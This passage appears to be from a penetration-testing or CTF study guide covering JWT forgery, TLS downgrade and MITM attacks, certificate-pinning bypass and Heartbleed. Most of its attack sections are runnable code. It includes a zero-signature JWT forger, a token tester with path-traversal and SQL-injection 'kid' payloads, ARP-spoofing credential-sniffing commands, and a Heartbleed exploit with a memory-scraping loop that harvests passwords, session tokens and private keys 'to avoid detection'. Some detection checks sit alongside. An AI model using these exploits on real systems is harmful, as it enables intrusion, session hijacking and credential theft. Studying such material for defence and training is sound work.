# Test known Cisco default secrets
cat > cisco_secrets.txt << EOF
cisco
Cisco123
secretkey
default
admin
EOF

python3 jwt_tool.py <JWT> -C -d cisco_secrets.txt
```

**CVE-2019-20933 (InfluxDB):**

JWT authentication bypass through shared secret prediction.

```bash
# InfluxDB versions < 1.7.6
# Shared secret derived from predictable source

# Test default/common secrets
python3 << 'EOF'
import jwt
import hashlib

# Common InfluxDB secret derivation patterns
test_secrets = [
    hashlib.sha256(b"influxdb").hexdigest(),
    "influxdb",
    "root",
]

token = "captured_jwt_here"

for secret in test_secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"[+] Valid secret: {secret}")
        print(f"[+] Payload: {decoded}")
        break
    except jwt.InvalidSignatureError:
        continue
EOF
```

**CVE-2020-28042 (WordPress plugin JWT vulnerabilities):**

Multiple WordPress JWT plugins vulnerable to weak secret generation.

```bash
# Test WordPress-specific secrets
cat > wp_jwt_secrets.txt << EOF
wp_jwt_auth
wordpress
wp_secret
put_your_secret_here
wp-json
jwt-auth-secret
EOF

python3 jwt_tool.py <JWT> -C -d wp_jwt_secrets.txt
```

**CVE-2022-21449 (Java Psychic Signatures):**

ECDSA signature validation bypass in Java (versions 15-18).

```python
#!/usr/bin/env python3
import jwt
import base64
import json

def psychic_signature_attack(token):
    """
    CVE-2022-21449: ECDSA with all-zero signature accepted
    Affects Java 15, 16, 17, 18
    """
    
    header, payload, sig = token.split('.')
    
    header_data = json.loads(base64.urlsafe_b64decode(header + '=='))
    payload_data = json.loads(base64.urlsafe_b64decode(payload + '=='))
    
    # Check if ECDSA algorithm
    if not header_data.get('alg', '').startswith('ES'):
        print("[-] Not an ECDSA token")
        return None
    
    print(f"[*] Original algorithm: {header_data['alg']}")
    
    # Modify payload
    payload_data['role'] = 'admin'
    payload_data['isAdmin'] = True
    
    # Re-encode
    new_header = base64.urlsafe_b64encode(
        json.dumps(header_data, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload_data, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    # Create all-zero ECDSA signature (r=0, s=0)
    # For ES256: signature is 64 bytes (32 bytes r + 32 bytes s)
    # For ES384: signature is 96 bytes
    # For ES512: signature is 132 bytes
    
    sig_lengths = {
        'ES256': 64,
        'ES384': 96,
        'ES512': 132
    }
    
    sig_len = sig_lengths.get(header_data['alg'], 64)
    zero_sig = base64.urlsafe_b64encode(b'\x00' * sig_len).decode().rstrip('=')
    
    malicious_jwt = f"{new_header}.{new_payload}.{zero_sig}"
    
    print(f"[+] Psychic signature JWT generated")
    print(f"[+] Target Java versions: 15.0.0 - 18.0.0")
    return malicious_jwt

# Example
token = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9..."
malicious = psychic_signature_attack(token)
if malicious:
    print(f"\nMalicious JWT:\n{malicious}")
```

### JWT Automated Testing Tools

**jwt_tool Comprehensive Scan:**

```bash
# Full automated scan
python3 jwt_tool.py <JWT> -M at \
  -t "https://target.com/api/endpoint" \
  -rh "Authorization: Bearer JWT_HERE" \
  -C -d /usr/share/wordlists/rockyou.txt

# Explanation of flags:
# -M at: "Mode All Tests" - runs all vulnerability checks
# -t: Target URL for testing modified tokens
# -rh: Request header template (JWT_HERE is replaced)
# -C: Crack mode with dictionary
# -d: Dictionary file path

# Specific attack modes:
# -X a: alg:none attack
# -X n: null signature
# -X b: blank password
# -X s: HMAC key confusion (need public key)
# -X k: RSA key confusion (need public key)
# -X i: Inject inline JWKS

# Example with all exploits
python3 jwt_tool.py <JWT> \
  -X a -X n -X b -X k \
  -pk public_key.pem \
  -t "https://target.com/api/admin" \
  -rh "Authorization: Bearer JWT_HERE"
```

**Custom JWT Testing Script:**

```python
#!/usr/bin/env python3
import jwt
import requests
import json
import sys
from base64 import urlsafe_b64encode, urlsafe_b64decode

class JWTTester:
    def __init__(self, token, target_url, headers=None):
        self.original_token = token
        self.target_url = target_url
        self.headers = headers or {}
        self.payload = jwt.decode(token, options={"verify_signature": False})
        self.header = jwt.get_unverified_header(token)
        
    def test_endpoint(self, test_token, description):
        """Test a JWT variant against the endpoint"""
        print(f"\n[*] Testing: {description}")
        print(f"    Token: {test_token[:80]}...")
        
        headers = self.headers.copy()
        headers['Authorization'] = f'Bearer {test_token}'
        
        try:
            response = requests.get(self.target_url, headers=headers, timeout=10)
            
            print(f"    Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"    [+] SUCCESS! Token accepted")
                print(f"    Response: {response.text[:200]}")
                return True
            elif response.status_code == 401:
                print(f"    [-] Unauthorized - Token rejected")
            else:
                print(f"    [?] Unexpected status code")
                
        except requests.RequestException as e:
            print(f"    [-] Error: {e}")
        
        return False
    
    def test_alg_none(self):
        """Test algorithm confusion to 'none'"""
        header = self.header.copy()
        header['alg'] = 'none'
        
        payload = self.payload.copy()
        payload['role'] = 'admin'
        
        # Manual encoding (jwt library won't create alg:none)
        def b64url(data):
            return urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).decode().rstrip('=')
        
        token = f"{b64url(header)}.{b64url(payload)}."
        
        return self.test_endpoint(token, "Algorithm: none")
    
    def test_null_signature(self):
        """Test null/empty signature"""
        header = self.header.copy()
        payload = self.payload.copy()
        payload['role'] = 'admin'
        
        def b64url(data):
            return urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).decode().rstrip('=')
        
        tokens = [
            f"{b64url(header)}.{b64url(payload)}.",
            f"{b64url(header)}.{b64url(payload)}",
        ]
        
        for token in tokens:
            if self.test_endpoint(token, "Null signature variant"):
                return True
        return False
    
    def test_weak_secrets(self, wordlist):
        """Test common weak secrets"""
        print(f"\n[*] Testing weak secrets from: {wordlist}")
        
        with open(wordlist, 'r', errors='ignore') as f:
            for i, secret in enumerate(f):
                secret = secret.strip()
                
                if i % 1000 == 0:
                    print(f"\r    Progress: {i} secrets tested", end='', flush=True)
                
                try:
                    # Verify signature
                    jwt.decode(self.original_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    print(f"\n    [+] SECRET FOUND: {secret}")
                    
                    # Create admin token
                    payload = self.payload.copy()
                    payload['role'] = 'admin'
                    
                    admin_token = jwt.encode(payload, secret, algorithm=self.header['alg'])
                    self.test_endpoint(admin_token, f"Valid secret: {secret}")
                    
                    return True
                    
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
        
        print(f"\n    [-] No weak secret found")
        return False
    
    def test_kid_injection(self):
        """Test kid parameter injection"""
        payloads = [
            "/dev/null",
            "../../../../../dev/null",
            "../../../../../../etc/passwd",
            "' OR '1'='1",
            "' UNION SELECT 'secret' --",
        ]
        
        for kid_val in payloads:
            try:
                # Try with empty secret (for /dev/null)
                payload = self.payload.copy()
                payload['role'] = 'admin'
                
                token = jwt.encode(
                    payload,
                    "",
                    algorithm='HS256',
                    headers={"kid": kid_val, "typ": "JWT"}
                )
                
                if self.test_endpoint(token, f"kid injection: {kid_val}"):
                    return True
                    
            except Exception as e:
                pass
        
        return False
    
    def run_all_tests(self, wordlist=None):
        """Run all JWT vulnerability tests"""
        print(f"[*] JWT Security Testing")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Original Algorithm: {self.header.get('alg')}")
        print(f"[*] Original Payload: {json.dumps(self.payload, indent=2)}")
        
        results = {
            "alg_none": self.test_alg_none(),
            "null_signature": self.test_null_signature(),
            "kid_injection": self.test_kid_injection(),
        }
        
        if wordlist:
            results["weak_secret"] = self.test_weak_secrets(wordlist)
        
        print("\n" + "="*60)
        print("RESULTS SUMMARY")
        print("="*60)
        
        for test, success in results.items():
            status = "[+] VULNERABLE" if success else "[-] Not vulnerable"
            print(f"{test:20s}: {status}")
        
        return results

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <JWT> <target_url> [wordlist]")
        sys.exit(1)
    
    token = sys.argv[1]
    url = sys.argv[2]
    wordlist = sys.argv[3] if len(sys.argv) > 3 else None
    
    tester = JWTTester(token, url)
    tester.run_all_tests(wordlist)
```

**Burp Suite JWT Extensions:**

```bash
# Install via Burp Extender -> BApp Store:
# 1. JSON Web Tokens
# 2. JWT Editor (by PortSwigger)
# 3. JWT Token Manipulation

# Manual testing workflow in Burp:
# 1. Intercept request with JWT
# 2. Send to Repeater
# 3. Decoder tab -> Decode base64url
# 4. Modify header/payload
# 5. Re-encode base64url
# 6. Test modified token

# Intruder for brute force:
# 1. Send JWT request to Intruder
# 2. Mark signature portion as payload position
# 3. Load wordlist for HMAC secrets
# 4. Set payload processing: base64url encode HMAC-SHA256 of header.payload
# 5. Start attack
# 6. Filter responses by status code
```

### JWT Best Practices and Mitigation Verification

**Security Checklist:**

```python
#!/usr/bin/env python3
import jwt
import requests
import json

def verify_jwt_security(target_url, sample_token):
    """
    Verify JWT implementation follows security best practices
    """
    
    print("[*] JWT Security Audit")
    print("="*60)
    
    checks = []
    
    # Check 1: Algorithm whitelist
    print("\n[*] Check 1: Algorithm Whitelist")
    header = jwt.get_unverified_header(sample_token)
    
    weak_algs = ['none', 'HS256']  # HS256 weak if short secret
    if header['alg'] in weak_algs:
        print(f"    [-] WEAK: Algorithm '{header['alg']}' detected")
        checks.append(("algorithm", False))
    else:
        print(f"    [+] OK: Algorithm '{header['alg']}'")
        checks.append(("algorithm", True))
    
    # Check 2: Expiration validation
    print("\n[*] Check 2: Expiration Validation")
    try:
        payload = jwt.decode(sample_token, options={"verify_signature": False})
        
        if 'exp' not in payload:
            print("    [-] MISSING: No 'exp' claim")
            checks.append(("expiration", False))
        else:
            import time
            exp_time = payload['exp']
            current_time = int(time.time())
            
            if exp_time < current_time:
                print(f"    [?] Token expired (good for testing)")
                # Test if server accepts expired token
                # (Implementation depends on test setup)
            
            # Check expiration window
            if exp_time - current_time > 86400:  # >24 hours
                print(f"    [-] WEAK: Expiration too long ({(exp_time - current_time)/3600:.1f} hours)")
                checks.append(("expiration", False))
            else:
                print(f"    [+] OK: Reasonable expiration")
                checks.append(("expiration", True))
                
    except Exception as e:
        print(f"    [-] ERROR: {e}")
        checks.append(("expiration", False))
    
    # Check 3: Critical claims present
    print("\n[*] Check 3: Required Claims")
    required_claims = ['iat', 'exp', 'sub', 'iss']
    
    for claim in required_claims:
        if claim in payload:
            print(f"    [+] Present: {claim}")
        else:
            print(f"    [-] MISSING: {claim}")
    
    # Check 4: Signature validation strictness
    print("\n[*] Check 4: Signature Validation")
    print("    [*] Testing signature bypass techniques...")
    
    # Summary
    print("\n" + "="*60)
    print("AUDIT SUMMARY")
    print("="*60)
    
    passed = sum(1 for _, status in checks if status)
    total = len(checks)
    
    print(f"Checks passed: {passed}/{total}")
    
    if passed == total:
        print("[+] JWT implementation appears secure")
    else:
        print("[-] Security issues detected")
    
    return checks

# Example usage
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
url = "https://target.com/api"

verify_jwt_security(url, token)
```

---

**Critical Related Topics for Advanced Study:**

- **Elliptic Curve Cryptography Attacks** - Invalid curve attacks, twist security, ECDH key recovery
- **RSA Implementation Vulnerabilities** - Coppersmith's attack, Wiener's attack on low private exponent
- **Length Extension Attacks** - Hash function vulnerabilities in custom authentication schemes
- **Format Oracle Attacks** - ASN.1 parsing vulnerabilities in certificate validation
- **Authenticated Encryption Modes** - GCM nonce reuse, AES-GCM authentication bypass techniques

---

# SSL/TLS Vulnerabilities

## SSL/TLS Downgrade Attacks

### Protocol Downgrade Fundamentals

**Attack Principle:** Force client and server to negotiate weaker protocol versions or cipher suites with known vulnerabilities, then exploit the degraded security.

**Vulnerable Protocol Versions:**

```
SSLv2 (1995) - Completely broken, multiple critical flaws
SSLv3 (1996) - Vulnerable to POODLE, deprecated RFC 7568
TLS 1.0 (1999) - Vulnerable to BEAST, weak by modern standards
TLS 1.1 (2006) - Deprecated RFC 8996 (2021)
TLS 1.2 (2008) - Secure with proper cipher configuration
TLS 1.3 (2018) - Current standard, removed legacy features
```

### Detection and Enumeration

**Testing Protocol Support with `nmap`:**

```bash
# Comprehensive SSL/TLS enumeration
nmap --script ssl-enum-ciphers -p 443 target.com

# Specific protocol version testing
nmap --script ssl-enum-ciphers --script-args='sslversions={TLSv1.0,TLSv1.1,TLSv1.2}' \
  -p 443 target.com

# Test for SSLv2/SSLv3 support (major red flags)
nmap --script sslv2,ssl-known-key -p 443 target.com
```

**Using `testssl.sh` (Comprehensive Testing Tool):**

```bash
# Install
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# Full vulnerability scan
./testssl.sh --vulnerable https://target.com

# Test specific protocol versions
./testssl.sh --protocols https://target.com

# Test cipher suites
./testssl.sh --ciphers https://target.com

# Check for downgrade attack vulnerabilities
./testssl.sh --pfs --protocols -S https://target.com

# JSON output for parsing
./testssl.sh --jsonfile results.json https://target.com
```

**Using `sslscan`:**

```bash
# Install
apt install sslscan

# Basic scan
sslscan target.com:443

# Show certificate details
sslscan --show-certificate target.com:443

# Test specific TLS version
sslscan --tls12 target.com:443

# Verbose output with all cipher attempts
sslscan --verbose target.com:443
```

### MITM Downgrade Attack Techniques

**Using `sslstrip` (HTTP Downgrade):**

```bash
# Install
apt install sslstrip

# Setup IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure iptables to redirect HTTPS traffic
iptables -t nat -A PREROUTING -p tcp --destination-port 80 \
  -j REDIRECT --to-port 8080

# Run sslstrip
sslstrip -l 8080 -w sslstrip.log

# Monitor captured credentials
tail -f sslstrip.log

# Note: Effectiveness limited by HSTS and modern browser protections
```

**Using `bettercap` for MITM with SSL Stripping:**

```bash
# Install
apt install bettercap

# Start interactive session
bettercap -iface eth0

# In bettercap console:
> set http.proxy.sslstrip true
> set arp.spoof.targets 192.168.1.0/24
> http.proxy on
> arp.spoof on
> net.sniff on

# Capture credentials
> set net.sniff.filter "tcp port 80 or tcp port 443"
> set net.sniff.regexp '.*password=.+'
```

**Protocol Downgrade with `ssl_bump` (Squid Proxy):**

```bash
# Squid configuration for SSL interception
# /etc/squid/squid.conf

http_port 3128 ssl-bump \
  cert=/etc/squid/ssl_cert/myCA.pem \
  generate-host-certificates=on \
  dynamic_cert_mem_cache_size=4MB

ssl_bump server-first all
ssl_bump bump all

# Force weaker ciphers
sslproxy_cipher LOW:EXP:aNULL
```

### Cipher Suite Downgrade Attacks

**Testing Weak Cipher Support:**

```bash
# Test for EXPORT ciphers (FREAK vulnerability)
nmap --script ssl-enum-ciphers --script-args='sslcipher=EXPORT' \
  -p 443 target.com

# Manual OpenSSL testing for specific weak ciphers
openssl s_client -connect target.com:443 -cipher 'EXPORT'
openssl s_client -connect target.com:443 -cipher 'DES-CBC-SHA'
openssl s_client -connect target.com:443 -cipher 'RC4-SHA'
openssl s_client -connect target.com:443 -cipher 'NULL'
```

**Python Script for Cipher Downgrade Testing:**

```python
import ssl
import socket

def test_cipher_suite(host, port, cipher):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers(cipher)
    
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                return {
                    'cipher': cipher,
                    'negotiated': ssock.cipher(),
                    'version': ssock.version(),
                    'vulnerable': True
                }
    except Exception as e:
        return {'cipher': cipher, 'vulnerable': False, 'error': str(e)}

# Test weak ciphers
weak_ciphers = [
    'DES-CBC3-SHA',      # 3DES (Sweet32 attack)
    'RC4-SHA',           # RC4 (biased keystream)
    'EXPORT',            # Export-grade ciphers (FREAK)
    'aNULL',             # No authentication
    'eNULL',             # No encryption
]

host = "target.com"
port = 443

print("[*] Testing weak cipher support:")
for cipher in weak_ciphers:
    result = test_cipher_suite(host, port, cipher)
    if result.get('vulnerable'):
        print(f"[!] VULNERABLE: {cipher} accepted")
        print(f"    Negotiated: {result['negotiated']}")
    else:
        print(f"[+] {cipher} rejected")
```

### FREAK Attack (Factoring RSA Export Keys)

**Concept:** Force server to use EXPORT-grade RSA keys (512-bit), which can be factored in hours/days.

**Testing for FREAK Vulnerability:**

```bash
# Using nmap
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i export

# Using OpenSSL
openssl s_client -connect target.com:443 -cipher EXPORT

# Expected vulnerable response:
# "Cipher    : EXP-DES-CBC-SHA" or similar EXPORT cipher
```

**Exploitation Framework (Concept):**

```
1. MITM position established
2. Intercept ClientHello, modify cipher list to only EXPORT ciphers
3. Server responds with EXPORT cipher (512-bit RSA)
4. Capture server's RSA public key
5. Factor RSA key offline (using tools like Cado-NFS)
6. Decrypt TLS traffic with recovered private key
```

### BEAST (Browser Exploit Against SSL/TLS)

**Vulnerability Details:**

- Affects TLS 1.0 and earlier using CBC mode ciphers
- Exploits predictable IV (Initialization Vector) in CBC
- Requires JavaScript execution in victim's browser

**Testing for BEAST Vulnerability:**

```bash
# Check if server supports TLS 1.0 with CBC ciphers
testssl.sh --vulnerable https://target.com | grep -i beast

# Manual verification
openssl s_client -connect target.com:443 -tls1 -cipher 'AES128-CBC'
```

**Exploitation Requirements:**

```
1. Target must support TLS 1.0
2. CBC-mode cipher must be negotiated
3. Attacker needs MITM position
4. Victim must execute attacker's JavaScript
5. Multiple requests to same HTTPS endpoint required

[Inference] Modern browsers implement mitigation via 1/n-1 record splitting
```

### Logjam Attack

**Vulnerability:** Downgrade TLS connection to use EXPORT-grade Diffie-Hellman (512-bit DHE).

**Detection:**

```bash
# Test for weak DHE parameters
testssl.sh --vulnerable https://target.com | grep -i logjam

# Using nmap
nmap --script ssl-dh-params -p 443 target.com

# OpenSSL test
openssl s_client -connect target.com:443 -cipher 'EDH'
```

**Vulnerable Configuration Indicators:**

```
# nmap output showing vulnerability:
TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 512) - WEAK

# Should be:
TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (dh 2048) - STRONG
```

## Certificate Validation Bypass

### Certificate Validation Weaknesses

**Common Bypass Techniques:**

1. **Hostname Mismatch Tolerance**
2. **Expired Certificate Acceptance**
3. **Self-Signed Certificate Acceptance**
4. **Missing Certificate Chain Validation**
5. **Weak Certificate Signature Algorithms**

### Testing Certificate Validation

**Using `openssl` for Certificate Analysis:**

```bash
# Retrieve and examine certificate
openssl s_client -connect target.com:443 -showcerts

# Extract certificate to file
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -outform PEM > cert.pem

# Examine certificate details
openssl x509 -in cert.pem -text -noout

# Check certificate validity dates
openssl x509 -in cert.pem -noout -dates

# Verify certificate signature algorithm
openssl x509 -in cert.pem -noout -text | grep "Signature Algorithm"

# Check Subject Alternative Names (SAN)
openssl x509 -in cert.pem -noout -text | grep -A1 "Subject Alternative Name"
```

**Testing Certificate Chain Validation:**

```bash
# Verify certificate chain
openssl s_client -connect target.com:443 -CApath /etc/ssl/certs/

# Test with specific CA bundle
openssl s_client -connect target.com:443 -CAfile /path/to/ca-bundle.crt

# Expected output for valid chain:
# "Verify return code: 0 (ok)"

# Invalid chain shows:
# "Verify return code: 21 (unable to verify the first certificate)"
```

**Detecting Self-Signed Certificates:**

```bash
# Check if certificate is self-signed
openssl x509 -in cert.pem -noout -issuer -subject

# Self-signed if issuer == subject

# Using testssl.sh
testssl.sh --protocols https://target.com | grep -i "self-signed"
```

### Application-Level Validation Bypass

**Python HTTPS Certificate Bypass (Testing):**

```python
import requests
import urllib3

# Disable SSL warnings (for testing only)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Bypass certificate verification (INSECURE - testing only)
response = requests.get('https://target.com', verify=False)

# Proper testing: Check if app accepts invalid certificates
import ssl

# Create unverified context
context = ssl._create_unverified_context()

# Test if connection succeeds with invalid cert
import urllib.request
try:
    response = urllib.request.urlopen(
        'https://target.com', 
        context=context
    )
    print("[!] Application accepts invalid certificates")
except:
    print("[+] Certificate validation enforced")
```

**Android App Certificate Pinning Bypass:**

```bash
# Using Frida for runtime manipulation
pip install frida-tools

# Install Frida server on rooted Android device
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Use frida-ssl-unpinning script
git clone https://github.com/httptoolkit/frida-android-unpinning
frida -U -f com.target.app -l frida-script.js --no-pause
```

**Burp Suite Certificate Installation:**

```bash
# For intercepting HTTPS traffic during testing

# 1. Export Burp CA certificate
# Proxy → Options → Import/Export CA Certificate

# 2. Install on Linux system
sudo cp burp-ca-cert.der /usr/local/share/ca-certificates/burp.crt
sudo update-ca-certificates

# 3. Configure application to use Burp proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# 4. Test if certificate pinning present
curl https://target.com --proxy http://127.0.0.1:8080
# If fails with certificate error, pinning is active
```

### Weak Signature Algorithm Exploitation

**Testing for Weak Signatures:**

```bash
# Check signature algorithm
openssl x509 -in cert.pem -noout -text | grep "Signature Algorithm"

# Vulnerable algorithms:
# - MD5withRSA (completely broken)
# - SHA1withRSA (deprecated, collision attacks possible)

# Modern secure algorithms:
# - SHA256withRSA
# - SHA384withRSA
# - SHA512withRSA
```

**Detection Script:**

```python
import ssl
import socket
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def check_certificate_signature(host, port=443):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            cert_der = ssock.getpeercert(binary_form=True)
            cert = x509.load_der_x509_certificate(cert_der, default_backend())
            
            sig_algo = cert.signature_algorithm_oid._name
            print(f"[*] Certificate for {host}")
            print(f"    Signature Algorithm: {sig_algo}")
            
            weak_algos = ['md5', 'sha1']
            if any(weak in sig_algo.lower() for weak in weak_algos):
                print(f"[!] WEAK signature algorithm detected!")
                return False
            else:
                print(f"[+] Signature algorithm acceptable")
                return True

check_certificate_signature('target.com')
```

### Hostname Verification Bypass

**Testing Hostname Validation:**

```bash
# Connect using different hostname than certificate CN/SAN
openssl s_client -connect 192.168.1.10:443 -servername target.com

# If connection succeeds despite hostname mismatch:
# [!] Hostname verification may be weak
```

**Manual Testing with `curl`:**

```bash
# Test strict hostname verification
curl https://target.com

# Test with IP instead of hostname
curl https://192.168.1.10
# Should fail if validation is strict

# Bypass verification (testing only)
curl -k https://192.168.1.10
# -k flag disables certificate verification
```

## Heartbleed (CVE-2014-0160)

### Vulnerability Overview

**Affected Versions:**

- OpenSSL 1.0.1 through 1.0.1f (released March 14, 2012)
- OpenSSL 1.0.2-beta through 1.0.2-beta1

**Vulnerability Mechanism:** Buffer over-read in TLS heartbeat extension implementation allows reading up to 64KB of server memory per request.

**Data Exposed:**

- Private keys
- Session cookies
- Usernames and passwords
- Sensitive application data
- Other users' request/response data

### Detection

**Using `nmap`:**

```bash
# Heartbleed detection script
nmap -p 443 --script ssl-heartbleed target.com

# Expected vulnerable output:
# |_ssl-heartbleed: VULNERABLE: OpenSSL Heartbleed information leak

# Scan multiple hosts
nmap -p 443 --script ssl-heartbleed -iL targets.txt -oA heartbleed_scan
```

**Using `testssl.sh`:**

```bash
# Comprehensive Heartbleed test
testssl.sh --vulnerable https://target.com | grep -i heartbleed

# Output indicators:
# VULNERABLE (NOT ok): Heartbleed (CVE-2014-0160)
```

**Using Metasploit:**

```bash
msfconsole

# Use Heartbleed auxiliary module
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target.com
set RPORT 443
set VERBOSE true
run

# Leaked data displayed in hex dump format
```

### Manual Exploitation

**Python Exploitation Script:**

```python
#!/usr/bin/env python
import socket
import struct
import sys

def heartbleed_exploit(host, port=443):
    # TLS Heartbeat request with inflated payload length
    heartbeat_request = (
        b'\x18'          # Content Type: Heartbeat (24)
        b'\x03\x02'      # TLS Version: 1.1
        b'\x00\x03'      # Length: 3 bytes
        b'\x01'          # Heartbeat Message Type: Request (1)
        b'\x40\x00'      # Payload Length: 16384 (inflated)
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Send Client Hello
        sock.send(b'\x16\x03\x01\x00\xdc')  # Simplified ClientHello
        response = sock.recv(4096)
        
        # Send malicious heartbeat
        sock.send(heartbeat_request)
        
        # Receive leaked memory
        leaked_data = sock.recv(16384)
        
        print(f"[+] Received {len(leaked_data)} bytes of leaked memory:")
        print(leaked_data.hex())
        
        # Search for patterns indicating sensitive data
        if b'password' in leaked_data.lower() or b'session' in leaked_data.lower():
            print("[!] Potentially sensitive data detected in leak!")
        
        sock.close()
        return leaked_data
        
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Attempting Heartbleed exploit against {target}")
    
    # Multiple attempts to increase data retrieval
    for i in range(10):
        print(f"\n[*] Attempt {i+1}/10")
        heartbleed_exploit(target)
```

**Using `heartbleeder` Tool:**

```bash
# Install
go get github.com/titanous/heartbleeder

# Run scan
heartbleeder target.com:443

# Vulnerable output:
# VULNERABLE: target.com:443 - leaked X bytes of memory
```

### Exploitation for CTF Scenarios

**Memory Dump Analysis:**

```bash
# Capture multiple heartbleed responses to file
for i in {1..100}; do
    python3 heartbleed_exploit.py target.com >> memory_dump.bin
done

# Search for common patterns
strings memory_dump.bin | grep -E '(password|flag|key|token|session)'

# Search for flag format
strings memory_dump.bin | grep -E 'flag\{.*\}'
strings memory_dump.bin | grep -E 'CTF\{.*\}'

# Extract potential private keys
strings memory_dump.bin | grep -A20 "BEGIN.*PRIVATE KEY"
```

**Automated Memory Scraping:**

```python
import re
import time

def repeated_heartbleed(host, iterations=100):
    all_data = b''
    
    for i in range(iterations):
        leaked = heartbleed_exploit(host)
        if leaked:
            all_data += leaked
        time.sleep(0.1)  # Avoid detection
    
    # Extract common sensitive patterns
    patterns = {
        'passwords': re.findall(rb'password[=:]\s*(\w+)', all_data, re.I),
        'flags': re.findall(rb'flag\{[^}]+\}', all_data, re.I),
        'sessions': re.findall(rb'session[=:]\s*([a-f0-9]{32,})', all_data, re.I),
        'keys': re.findall(rb'-----BEGIN.*KEY-----.*?-----END.*KEY-----', 
                          all_data, re.DOTALL)
    }
    
    print("\n[*] Extracted Sensitive Data:")
    for category, matches in patterns.items():
        if matches:
            print(f"\n{category.upper()}:")
            for match in set(matches):
                print(f"  {match.decode(errors='ignore')}")

repeated_heartbleed('target.com', 100)
```

### Post-Exploitation

**Private Key Extraction:**

```bash
# If RSA private key found in memory dump
grep -a "BEGIN RSA PRIVATE KEY" memory_dump.bin -A 20 > server_key.pem

# Verify key format
openssl rsa -in server_key.pem -check

# Extract public key from private key
openssl rsa -in server_key.pem -pubout -out public_key.pem

# Compare with server's certificate
openssl x509 -in server_cert.pem -pubkey -noout > server_public.pem
diff public_key.pem server_public.pem

# If identical: full TLS compromise achieved
```

## POODLE (Padding Oracle On Downgraded Legacy Encryption)

### Original POODLE (SSLv3)

**Vulnerability Details:**

- CVE-2014-3566
- Exploits CBC padding validation in SSLv3
- Allows decryption of encrypted data (e.g., session cookies)
- Requires attacker to force SSLv3 downgrade and inject JavaScript

**Detection:**

```bash
# Test if server supports SSLv3
openssl s_client -connect target.com:443 -ssl3

# Expected secure response:
# "no protocols available" or connection refused

# Vulnerable response:
# Successfully establishes SSLv3 connection

# Using nmap
nmap --script ssl-enum-ciphers -p 443 target.com | grep SSLv3

# Using testssl.sh
testssl.sh --protocols https://target.com | grep -i "sslv3"
```

**Comprehensive POODLE Testing:**

```bash
# Test for POODLE vulnerability
testssl.sh --vulnerable https://target.com | grep -i poodle

# Output interpretation:
# "VULNERABLE (NOT ok): POODLE (CVE-2014-3566)" = vulnerable
# "not vulnerable (OK)" = patched
```

### POODLE-TLS (TLS-FALLBACK-SCSV Missing)

**Vulnerability:** Similar attack on TLS 1.0-1.2 implementations with improper padding validation.

**Testing for TLS-FALLBACK-SCSV Support:**

```bash
# Check if server supports fallback protection
openssl s_client -connect target.com:443 -fallback_scsv

# Server should reject inappropriate fallback attempts

# Using testssl.sh
testssl.sh --vulnerable https://target.com | grep -i "poodle.*tls"
```

### Exploitation Methodology

**Attack Requirements:**

```
1. Victim uses browser supporting SSLv3 fallback
2. Attacker in MITM position
3. Server accepts SSLv3 connections
4. CBC cipher negotiated
5. Ability to inject JavaScript into victim's browser
6. Multiple requests to target HTTPS resource
```

**Exploitation Flow:**

```
1. MITM attacker blocks TLS connections from victim
2. Browser falls back to SSLv3
3. Attacker injects JavaScript to make repeated requests
4. Each request includes target encrypted data (e.g., cookie)
5. Attacker manipulates CBC padding in repeated requests
6. Padding oracle reveals one byte per ~256 requests
7. Repeat until entire session cookie decrypted
```

**Python Framework for POODLE (Conceptual):**

```python
# [Inference] This demonstrates the concept; actual exploitation requires
# extensive cryptographic operations and MITM positioning

import ssl
import socket

def test_sslv3_support(host, port=443):
    """Check if SSLv3 is supported"""
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock) as ssock:
                print(f"[!] {host} supports SSLv3 - VULNERABLE to POODLE")
                print(f"    Cipher: {ssock.cipher()}")
                return True
    except Exception as e:
        print(f"[+] {host} does not support SSLv3 - NOT vulnerable")
        return False

def check_cbc_cipher(host, port=443):
    """Check if CBC mode ciphers are supported"""
    cbc_ciphers = [
        'AES128-SHA',
        'AES256-SHA',
        'DES-CBC3-SHA',
    ]
    
    for cipher in cbc_ciphers:
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
